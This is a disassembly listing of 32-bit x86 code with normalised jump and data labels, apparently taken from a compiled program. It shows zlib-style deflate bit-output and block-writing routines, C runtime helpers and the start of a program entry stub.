mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x169c ]
mov dx [ ebp + 0xc ]
mov [ eax + ecx * 2 ] dx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1690 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1698 ]
mov dl [ ebp + 0x10 ]
mov [ ecx + eax ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1698 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1698 ] ecx
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16a8 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16a8 ] eax
mov edx [ ebp + 0xc ]
sub edx 0x1
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x10 ]
xor ecx ecx
mov cl [ eax + r--data ]
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 4 + 0x490 ]
add ax 0x1
mov ecx [ ebp + 0x10 ]
xor edx edx
mov dl [ ecx + r--data ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + edx * 4 + 0x490 ] ax
cmp [ ebp + 0xc ] 0x100
jae r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + eax * 4 + 0x8c ]
add dx 0x1
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax * 4 + 0x8c ] dx
jmp r-xdata
mov ecx [ ebp + 0xc ]
shr ecx 0x7
xor edx edx
mov dl [ ecx + r--data ]
mov [ ebp - 0x4 ] edx
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + r--data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1694 ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
xor edx edx
cmp [ ecx + 0x1698 ] eax
sete dl
mov eax edx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + eax * 4 + 0x980 ]
add dx 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + eax * 4 + 0x980 ] dx
sub_409fa2
push ebp
mov ebp esp
sub esp 0x48
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1698 ] 0x0
je r-xdata
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + 0x402 ]
mov [ ebp - 0x40 ] eax
mov ecx 0x10
sub ecx [ ebp - 0x40 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x16b4 ] ecx
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x169c ]
mov eax [ ebp - 0x14 ]
xor ecx ecx
mov cx [ edx + eax * 2 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1690 ]
mov ecx [ ebp - 0x14 ]
xor edx edx
mov dl [ eax + ecx ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
xor edx edx
mov dx [ ecx + 0x400 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov ecx [ ebp + 0x8 ]
mov ax [ ecx + 0x16b0 ]
or ax dx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
add eax [ ebp - 0x40 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b4 ] eax
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cx [ eax + 0x400 ]
mov [ ebp - 0x44 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x44 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x44 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x40 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
xor ecx ecx
mov cl [ eax + r--data ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0x406 ]
mov [ ebp - 0x20 ] ecx
mov edx 0x10
sub edx [ ebp - 0x20 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + ecx * 4 + 0x2 ]
mov [ ebp - 0x18 ] eax
mov ecx 0x10
sub ecx [ ebp - 0x18 ]
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x16b4 ] ecx
jle r-xdata
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + 0x402 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16ac ] eax
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + ecx * 4 + 0x404 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x16b4 ]
shl eax cl
mov edx [ ebp + 0x8 ]
mov cx [ edx + 0x16b0 ]
or cx ax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + ecx * 4 + 0x404 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x24 ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x20 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0xc ]
xor eax eax
mov ax [ edx + ecx * 4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x16b4 ]
shl eax cl
mov edx [ ebp + 0x8 ]
mov cx [ edx + 0x16b0 ]
or cx ax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov eax [ ebp - 0xc ]
mov ecx [ ebp + 0xc ]
xor edx edx
mov dx [ ecx + eax * 4 ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x1c ]
mov ecx [ eax + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + 0x16b0 ]
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp - 0x1c ]
and eax 0xffff
mov ecx [ ebp + 0x8 ]
mov edx 0x10
sub edx [ ecx + 0x16b4 ]
mov ecx edx
sar eax cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x18 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
sub eax 0x1
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x100
jae r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
sub eax [ edx * 4 + r--data ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x28 ] ecx
mov edx 0x10
sub edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax * 4 + r--data ]
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
cmp ecx [ eax + 0x1698 ]
jb r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
shr eax 0x7
xor ecx ecx
mov cl [ eax + r--data ]
mov [ ebp - 0x48 ] ecx
mov ecx [ ebp - 0x8 ]
xor edx edx
mov dl [ ecx + r--data ]
mov [ ebp - 0x48 ] edx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x28 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x2c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x2c ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x2c ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x28 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0x10 ]
xor eax eax
mov ax [ edx + ecx * 4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x16b4 ]
shl eax cl
mov edx [ ebp + 0x8 ]
mov cx [ edx + 0x16b0 ]
or cx ax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0x10 ]
xor ecx ecx
mov cx [ eax + edx * 4 ]
mov [ ebp - 0x34 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x34 ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x34 ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x30 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
mov edx [ ebp - 0x48 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x10 ]
xor edx edx
mov dx [ ecx + eax * 4 + 0x2 ]
mov [ ebp - 0x30 ] edx
mov eax 0x10
sub eax [ ebp - 0x30 ]
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] eax
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
sub eax [ edx * 4 + r--data ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x38 ] ecx
mov edx 0x10
sub edx [ ebp - 0x38 ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] edx
jle r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax * 4 + r--data ]
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov ecx [ ecx + 0x16b4 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov cx [ eax + 0x16b0 ]
or cx dx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] cx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x16b4 ]
add ecx [ ebp - 0x38 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0x3c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x3c ]
mov ecx [ edx + 0x16b4 ]
shl eax cl
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
or dx ax
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ ebp - 0x3c ]
and edx 0xffff
mov eax [ ebp + 0x8 ]
mov ecx 0x10
sub ecx [ eax + 0x16b4 ]
sar edx cl
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] dx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x16b4 ]
mov ecx [ ebp - 0x38 ]
lea edx [ eax + ecx - 0x10 ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
jmp r-xdata
sub_40a7ea
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0xc ] 0x80
jge r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + eax * 4 + 0x8c ]
mov eax [ ebp - 0x4 ]
add eax edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x100
jge r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cx [ eax + edx * 4 + 0x8c ]
mov edx [ ebp - 0x8 ]
add edx ecx
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x7
jge r-xdata
mov eax [ ebp - 0x8 ]
shr eax 0x2
cmp eax [ ebp - 0x4 ]
sbb ecx ecx
inc ecx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x1c ] cl
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
xor eax eax
mov ax [ edx + ecx * 4 + 0x8c ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
jmp r-xdata
sub_40a89c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
and eax 0x1
mov ecx [ ebp - 0x4 ]
or ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
shr edx 0x1
mov [ ebp + 0x8 ] edx
mov eax [ ebp - 0x4 ]
shl eax 0x1
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0xc ]
sub ecx 0x1
mov [ ebp + 0xc ] ecx
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov eax [ ebp - 0x4 ]
shr eax 0x1
mov esp ebp
pop ebp
retn
sub_40a8dd
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] 0x8
jl r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16b0 ] 0x0
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b4 ] 0x0
jmp r-xdata
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
mov eax [ ebp + 0x8 ]
mov al [ eax + 0x16b0 ]
mov [ edx + ecx ] al
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
mov dx [ ecx + 0x16b0 ]
shr dx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b0 ] dx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x16b4 ]
sub edx 0x8
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] edx
sub_40a9c6
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x16b4 ] 0x8
jle r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x16b4 ] 0x0
jle r-xdata
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x8 ]
xor edx edx
mov dx [ ecx + 0x16b0 ]
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x16b0 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x16b4 ] 0x0
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov cl [ ecx + 0x16b0 ]
mov [ eax + edx ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] eax
sub_40aa82
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
call sub_40a9c6
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x16ac ] 0x8
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x10 ]
sub edx 0x1
mov [ ebp + 0x10 ] edx
test ecx ecx
je r-xdata
mov edx [ ebp + 0x10 ]
and edx 0xffff
and edx 0xff
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
mov ecx [ ebp + 0x10 ]
and ecx 0xffff
sar ecx 0x8
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ eax + edx ] cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0x10 ]
not eax
and eax 0xffff
and eax 0xff
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x14 ]
mov [ edx + ecx ] al
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x14 ] eax
mov edx [ ebp + 0x10 ]
not edx
and edx 0xffff
sar edx 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ecx + eax ] dl
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x14 ] edx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
mov edx [ ebp + 0xc ]
mov dl [ edx ]
mov [ ecx + eax ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x14 ] ecx
mov eax [ ebp + 0xc ]
add eax 0x1
mov [ ebp + 0xc ] eax
jmp r-xdata
sub_40abe0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_40ac20
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
